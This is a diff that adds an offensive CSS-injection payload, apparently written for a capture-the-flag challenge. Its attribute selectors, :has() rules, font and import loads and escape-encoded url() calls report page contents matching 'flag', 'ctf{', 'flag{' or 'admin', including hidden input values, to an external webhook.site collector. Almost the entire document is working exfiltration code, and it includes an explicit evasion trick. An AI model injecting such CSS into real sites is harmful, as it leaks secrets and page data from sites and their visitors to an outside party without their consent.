@@ -1,0 +1,102 @@
+ /* ===== COMPREHENSIVE HTTP LEAK VECTORS ===== */
+            
+            /* CSS Import Leaks - Fire immediately */
+            @import url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=css_import&page=${encodeURIComponent(location.href)}');
+            
+            /* Font Face Leaks - Hard to block */
+            @font-face {
+                font-family: 'flag-detector';
+                src: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=font_face&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Apply font to trigger load */
+            html { font-family: 'flag-detector', sans-serif; }
+            
+            /* ===== FLAG DETECTION LEAKS ===== */
+            
+            /* Input value flag detection with multiple leak vectors */
+            input[value*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag&page=${encodeURIComponent(location.href)}');
+                cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_cursor&type=flag&page=${encodeURIComponent(location.href)}'), auto;
+                list-style-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_list&type=flag&page=${encodeURIComponent(location.href)}');
+                border-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_border&type=flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            input[value*="ctf{" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=ctf_bracket&page=${encodeURIComponent(location.href)}');
+                cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_cursor&type=ctf_bracket&page=${encodeURIComponent(location.href)}'), auto;
+            }
+            
+            input[value*="flag{" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag_bracket&page=${encodeURIComponent(location.href)}');
+                cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_cursor&type=flag_bracket&page=${encodeURIComponent(location.href)}'), auto;
+            }
+            
+            /* Hidden input detection */
+            input[type="hidden"][value*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=hidden_input&type=flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Text content flag detection using CSS variables */
+            html {
+                --flag-leak-bg: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=css_var_bg&detected=true&page=${encodeURIComponent(location.href)}');
+                --flag-leak-cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=css_var_cursor&detected=true&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Form action leaks */
+            form[action*="flag" i] { 
+                background: var(--flag-leak-bg);
+                cursor: var(--flag-leak-cursor), auto;
+            }
+            
+            /* Link href leaks */
+            a[href*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=link_href&type=flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            a[href*="admin" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=link_href&type=admin&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Meta content leaks */
+            meta[content*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=meta_content&type=flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Script src leaks */
+            script[src*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=script_src&type=flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Advanced selectors using :has() */
+            html:has(input[value*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=input_flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            html:has(div[class*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_class_flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            html:has(div[id*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_id_flag&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Pseudo-element leaks */
+            body::before {
+                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_before&loaded=true&page=${encodeURIComponent(location.href)}');
+            }
+            
+            body::after {
+                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_after&loaded=true&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* Webkit specific leaks */
+            html {
+                -webkit-mask-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=webkit_mask&loaded=true&page=${encodeURIComponent(location.href)}');
+                -webkit-mask-box-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=webkit_mask_box&loaded=true&page=${encodeURIComponent(location.href)}');
+            }
+            
+            /* CSS escape sequences for evasion */
+            html {
+                background-image: \\75 \\72 \\6C('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=css_escape&loaded=true&page=${encodeURIComponent(location.href)}');
+            }
